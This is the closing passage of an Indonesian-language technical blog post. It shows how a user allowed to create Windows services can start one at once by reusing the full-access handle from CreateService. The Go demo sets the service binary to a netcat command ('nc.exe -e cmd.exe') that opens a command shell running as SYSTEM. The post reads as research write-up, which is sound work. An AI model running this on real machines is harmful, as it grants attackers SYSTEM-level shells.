SVC tidak didapatkan dan handle SCMnya hanya sebatas level user.</p><h2 id=dont-close-the-handles>Don&rsquo;t Close the Handles!<a class=anchor aria-hidden=true href=#dont-close-the-handles>#</a></h2><p>Kalau kita lihat kembali ke proses pembuatan service, tepatnya pada tahap 2 fungsi <code>CreateSevice()</code> dipanggil, ternyata si pembuat service (level admin atau user dengan hak <code>SC_MANAGER_CREATE_SERVICE</code>) bisa <strong>menentukan level akses dirinya terhadap service yang dibuat</strong> dan handle SVC yang dikembalikan oleh fungsi tersebut akan memiliki level akses yang sama.</p><p>Jadi, jika saat pembuatan service A, level akses yang disuplai adalah <code>SERVICE_ALL_ACCESS</code> (full kontrol), maka handle SVC A pun akan memiliki level akses yang sama terhadap Service A, yaitu full kontrol. Sayangnya handle SVC A ini ditutup berbarengan dengan handle SCM (tahap 3 pembuatan service).</p><p>Lalu, kira-kira apa jadinya jika handle SVC A tersebut tidak ditutup seperti seharusnya, melainkan dilanjut dan disuplai ke fungsi <code>StartService</code>? Hal inilah yang ditemukan oleh 0xdf dan VbScrub!</p><p>Untuk mencoba hal tersebut tentunya kita perlu membuat custom program dahulu dan berikut adalah program yang saya tulis dalam bahasa Go (Programnya versi argumen, bisa di cek <a href=https://github.com/fahmifj/winapi-go>disini</a>).</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kn>package</span> <span class=nx>main</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=s>&#34;golang.org/x/sys/windows&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=c1>// Creation of a Service: STEP 1
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// Connect to scm to get a handle to create a service
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>scmHandle</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>windows</span><span class=p>.</span><span class=nf>OpenSCManager</span><span class=p>(</span><span class=kc>nil</span><span class=p>,</span> <span class=kc>nil</span><span class=p>,</span> <span class=nx>windows</span><span class=p>.</span><span class=nx>SC_MANAGER_CREATE_SERVICE</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>fmt</span><span class=p>.</span><span class=nf>Print</span><span class=p>(</span><span class=s>&#34;Error cannot create a service&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nx>os</span><span class=p>.</span><span class=nf>Exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// define service
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>serviceName</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>windows</span><span class=p>.</span><span class=nf>UTF16PtrFromString</span><span class=p>(</span><span class=s>&#34;MyService&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>serviceExecPath</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>windows</span><span class=p>.</span><span class=nf>UTF16PtrFromString</span><span class=p>(</span><span class=s>`C:\myservice\nc.exe -e cmd.exe localhost 9000`</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Creation of a ervice: STEP 2
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// Create a service
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=nx>svcHandle</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>windows</span><span class=p>.</span><span class=nf>CreateService</span><span class=p>(</span>
</span></span><span class=line><span class=cl>		<span class=nx>scmHandle</span><span class=p>,</span>                         <span class=c1>// SCM database
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=nx>serviceName</span><span class=p>,</span>                       <span class=c1>// name of service
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=kc>nil</span><span class=p>,</span>                               <span class=c1>// service name to display
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=nx>windows</span><span class=p>.</span><span class=nx>SERVICE_ALL_ACCESS</span><span class=p>,</span>        <span class=c1>// desired access
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=nx>windows</span><span class=p>.</span><span class=nx>SERVICE_WIN32_OWN_PROCESS</span><span class=p>,</span> <span class=c1>// service type
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=nx>windows</span><span class=p>.</span><span class=nx>SERVICE_DEMAND_START</span><span class=p>,</span>      <span class=c1>// start type
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=nx>windows</span><span class=p>.</span><span class=nx>SERVICE_ERROR_NORMAL</span><span class=p>,</span>      <span class=c1>// error control type
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=nx>serviceExecPath</span><span class=p>,</span>                   <span class=c1>// path to service&#39;s binary
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=kc>nil</span><span class=p>,</span>                               <span class=c1>// no load ordering group
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=kc>nil</span><span class=p>,</span>                               <span class=c1>// no tag identifier
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=kc>nil</span><span class=p>,</span>                               <span class=c1>// no dependencies
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=kc>nil</span><span class=p>,</span>                               <span class=c1>// LocalSystem account
</span></span></span><span class=line><span class=cl><span class=c1></span>		<span class=kc>nil</span><span class=p>,</span>                               <span class=c1>// no password
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>fmt</span><span class=p>.</span><span class=nf>Print</span><span class=p>(</span><span class=s>&#34;err&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nx>os</span><span class=p>.</span><span class=nf>Exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>	<span class=c1>// Creation of a Service: STEP 3
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=c1>// Don&#39;t close the svcHandle, instead send it to StartService
</span></span></span><span class=line><span class=cl><span class=c1></span>	<span class=k>if</span> <span class=nx>windows</span><span class=p>.</span><span class=nf>StartService</span><span class=p>(</span><span class=nx>svcHandle</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=kc>nil</span><span class=p>);</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>		<span class=nx>fmt</span><span class=p>.</span><span class=nf>Print</span><span class=p>(</span><span class=s>&#34;Error Starting service&#34;</span><span class=p>,</span> <span class=nx>err</span><span class=p>)</span>
</span></span><span class=line><span class=cl>		<span class=nx>os</span><span class=p>.</span><span class=nf>Exit</span><span class=p>(</span><span class=o>-</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=c1>// Creation of a Service: STEP 4
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=c1>// Finally close the handles
</span></span></span><span class=line><span class=cl><span class=c1></span>    <span class=nx>windows</span><span class=p>.</span><span class=nf>CloseServiceHandle</span><span class=p>(</span><span class=nx>svcHandle</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nx>windows</span><span class=p>.</span><span class=nf>CloseHandle</span><span class=p>(</span><span class=nx>scmHandle</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>VbScrub sendiri sebelumnya telah menuliskan kode untuk mendemonstrasikan hal ini, bisa dilihat <a href=https://github.com/VbScrub/ServiceInstallerTest>disini</a>.</p><p><em>Hasilnya</em>?</p><p>SYSTEM!*</p><p><div class=img-container><img src=imgs/image-20210813011334034.png alt=image-20210813011334034></div></p><blockquote><p>*Perlu diingat user yang menjalankan program sudah perlu hak akses <code>SC_MANAGER_CREATE_SERVICE</code>.</p></blockquote><p><em>Tapi, kenapa harus custom code?</em></p><p>Karena <code>sc.exe</code> sendiri tidak menyediakan opsi untuk meng-assign <code>SERVICE_ALL_ACCESS</code> pada service yang akan dibuat. Ditambah, setelah proses pembuatan service, handle-handlenya ditutup.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell><span class=line><span class=cl>C:<span class=se>\U</span>sers<span class=se>\f</span>ahmi&gt;sc create
</span></span><span class=line><span class=cl>DESCRIPTION:
</span></span><span class=line><span class=cl>        Creates a service entry in the registry and Service Database.
</span></span><span class=line><span class=cl>USAGE:
</span></span><span class=line><span class=cl>        sc &lt;server&gt; create <span class=o>[</span>service name<span class=o>]</span> <span class=o>[</span><span class=nv>binPath</span><span class=o>=</span> <span class=o>]</span> &lt;option1&gt; &lt;option2&gt;...
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>OPTIONS:
</span></span><span class=line><span class=cl>NOTE: The option name includes the equal sign.
</span></span><span class=line><span class=cl>      A space is required between the equal sign and the value.
</span></span><span class=line><span class=cl> <span class=nv>type</span><span class=o>=</span> &lt;own<span class=p>|</span>share<span class=p>|</span>interact<span class=p>|</span>kernel<span class=p>|</span>filesys<span class=p>|</span>rec<span class=p>|</span>userown<span class=p>|</span>usershare&gt;
</span></span><span class=line><span class=cl>       <span class=o>(</span><span class=nv>default</span> <span class=o>=</span> own<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=nv>start</span><span class=o>=</span> &lt;boot<span class=p>|</span>system<span class=p>|</span>auto<span class=p>|</span>demand<span class=p>|</span>disabled<span class=p>|</span>delayed-auto&gt;
</span></span><span class=line><span class=cl>       <span class=o>(</span><span class=nv>default</span> <span class=o>=</span> demand<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=nv>error</span><span class=o>=</span> &lt;normal<span class=p>|</span>severe<span class=p>|</span>critical<span class=p>|</span>ignore&gt;
</span></span><span class=line><span class=cl>       <span class=o>(</span><span class=nv>default</span> <span class=o>=</span> normal<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=nv>binPath</span><span class=o>=</span> &lt;BinaryPathName to the .exe file&gt;
</span></span><span class=line><span class=cl> <span class=nv>group</span><span class=o>=</span> &lt;LoadOrderGroup&gt;
</span></span><span class=line><span class=cl> <span class=nv>tag</span><span class=o>=</span> &lt;yes<span class=p>|</span>no&gt;
</span></span><span class=line><span class=cl> <span class=nv>depend</span><span class=o>=</span> &lt;Dependencies<span class=o>(</span>separated by / <span class=o>(</span>forward slash<span class=o>))</span>&gt;
</span></span><span class=line><span class=cl> <span class=nv>obj</span><span class=o>=</span> &lt;AccountName<span class=p>|</span>ObjectName&gt;
</span></span><span class=line><span class=cl>       <span class=o>(</span><span class=nv>default</span> <span class=o>=</span> LocalSystem<span class=o>)</span>
</span></span><span class=line><span class=cl> <span class=nv>DisplayName</span><span class=o>=</span> &lt;display name&gt;
</span></span><span class=line><span class=cl> <span class=nv>password</span><span class=o>=</span> &lt;password&gt;
</span></span></code></pre></div><h2 id=conclusion>Conclusion<a class=anchor aria-hidden=true href=#conclusion>#</a></h2><p>Disini kita tahu bahwa regular user dengan hak pembuatan service (<code>SC_MANAGER_CREATE_SERVICE</code>) dapat membuat sebuah service tapi tidak memiliki kontrol langsung untuk menjalankan service tersebut. Namun, beda ceritanya jika handle yang didapatkan dari pembuatan sebuah service langsung digunakan untuk melakukan kontrol terhadap service yang dibuat.</p><p>Saya sendiri setuju dengan VbScrub bahwa ini kemungkinan bukan security issue. Karena kalau kita mengacu ke <a href=https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights?>dokumentasi Microsoft</a>, bisa disimpulkan secara tidak langsung jika user yang mampu membuat service adalah termasuk admin.</p><p><div class=img-container><img src=imgs/image-20210812194031337.png alt=image-20210812194031337></div></p><p>Untuk eksploitasi hak <code>SC_MANAGER_CREATE_SERVICE</code> tanpa custom compiled program kita bisa mengubah nilai &ldquo;start up type&rdquo; si service ke otomatis ketika booting dengan mensuplai <code>start=auto</code> di <code>sc.exe</code>.</p><p>Sekian~</p><div class=footnotes role=doc-endnotes><hr><ol><li id=fn:1><p>*Ngulik itu sebangsa ngoprek 😅&#160;<a href=#fnref:1 class=footnote-backref role=doc-backlink>&#8617;&#xfe0e;</a></p></li></ol></div><div class=post-references><h2>References</h2><ul><li><a href=https://vbscrub.com/2020/06/02/windows-createservice-api-bypasses-service-permissions/ target=_blank rel="noopener noreferrer">https://vbscrub.com/2020/06/02/windows-createservice-api-bypasses-service-permissions/</a></li><li><a href=https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html target=_blank rel="noopener noreferrer">https://0xdf.gitlab.io/2020/06/01/resolute-more-beyond-root.html</a></li><li><a href=https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights target=_blank rel="noopener noreferrer">https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights</a></li><li><a href=https://docs.microsoft.com/en-us/windows/win32/services/installing-a-service target=_blank rel="noopener noreferrer">https://docs.microsoft.com/en-us/windows/win32/services/installing-a-service</a></li><li><a href=https://docs.microsoft.com/en-us/windows/win32/services/starting-a-service target=_blank rel="noopener noreferrer">https://docs.microsoft.com/en-us/windows/win32/services/starting-a-service</a></li></ul></div></div></div><footer class=post-footer><ul class=post-tags><li><a href=https://fahmifj.github.io/tags/windows/>Windows</a></li><li><a href=https://fahmifj.github.io/tags/windows-services/>Windows-Services</a></li><li><a href=https://fahmifj.github.io/tags/go/>Go</a></li></ul><div class=share-buttons><a target=_blank rel="noopener noreferrer" aria-label="share Windows Services: Start a Service During Its Creation [ID] on twitter" href="https://twitter.com/intent/tweet/?text=Windows%20Services%3a%20Start%20a%20Service%20During%20Its%20Creation%20%5bID%5d&url=https%3a%2f%2ffahmifj.github.io%2fblog%2fstart-a-windows-service-during-its-creation%2f&hashtags=Windows%2cWindows-Services%2cGo"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Windows Services: Start a Service During Its Creation [ID] on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fblog%2fstart-a-windows-service-during-its-creation%2f&title=Windows%20Services%3a%20Start%20a%20Service%20During%20Its%20Creation%20%5bID%5d&summary=Windows%20Services%3a%20Start%20a%20Service%20During%20Its%20Creation%20%5bID%5d&source=https%3a%2f%2ffahmifj.github.io%2fblog%2fstart-a-windows-service-during-its-creation%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Windows Services: Start a Service During Its Creation [ID] on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fblog%2fstart-a-windows-service-during-its-creation%2f&title=Windows%20Services%3a%20Start%20a%20Service%20During%20Its%20Creation%20%5bID%5d"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Windows Services: Start a Service During Its Creation [ID] on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fblog%2fstart-a-windows-service-during-its-creation%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Windows Services: Start a Service During Its Creation [ID] on whatsapp" href="https://api.whatsapp.com/send?text=Windows%20Services%3a%20Start%20a%20Service%20During%20Its%20Creation%20%5bID%5d%20-%20https%3a%2f%2ffahmifj.github.io%2fblog%2fstart-a-windows-service-during-its-creation%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 148.984zm81.721-111.581c-4.479-2.242-26.499-13.075-30.604-14.571-4.105-1.495-7.091-2.241-10.077 2.241-2.986 4.483-11.569 14.572-14.182 17.562-2.612 2.988-5.225 3.364-9.703 1.12-4.479-2.241-18.91-6.97-36.017-22.23C231.8 264.15 222.81 249.484 220.198 245s-.279-6.908 1.963-9.14c2.016-2.007 4.48-5.232 6.719-7.847 2.24-2.615 2.986-4.484 4.479-7.472 1.493-2.99.747-5.604-.374-7.846-1.119-2.241-10.077-24.288-13.809-33.256-3.635-8.733-7.327-7.55-10.077-7.688-2.609-.13-5.598-.158-8.583-.158-2.986.0-7.839 1.121-11.944 5.604-4.105 4.484-15.675 15.32-15.675 37.364.0 22.046 16.048 43.342 18.287 46.332 2.24 2.99 31.582 48.227 76.511 67.627 10.685 4.615 19.028 7.371 25.533 9.434 10.728 3.41 20.492 2.929 28.209 1.775 8.605-1.285 26.499-10.833 30.231-21.295 3.732-10.464 3.732-19.431 2.612-21.298-1.119-1.869-4.105-2.99-8.583-5.232z"/></svg></a><a target=_blank rel="noopener noreferrer" aria-label="share Windows Services: Start a Service During Its Creation [ID] on telegram" href="https://telegram.me/share/url?text=Windows%20Services%3a%20Start%20a%20Service%20During%20Its%20Creation%20%5bID%5d&url=https%3a%2f%2ffahmifj.github.io%2fblog%2fstart-a-windows-service-during-its-creation%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg></a></div></footer></article></div></main><footer class=footer><span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a>&nbsp;&&nbsp;<a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>&nbsp;(mod)</span>
<span><span class=copyright>&copy; 2022&nbsp;<a href=https://fahmifj.github.io/about>Fahmi FJ</a></span>
&nbsp;·&nbsp;
<span class=license><a href=https://creativecommons.org/licenses/by-nc-sa/4.0/>CC BY-NC-SA 4.0</a></span></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)"><button class=top-link id=top-link type=button accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg></button></a>
<script>let menu=document.getElementById("menu");menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)},document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>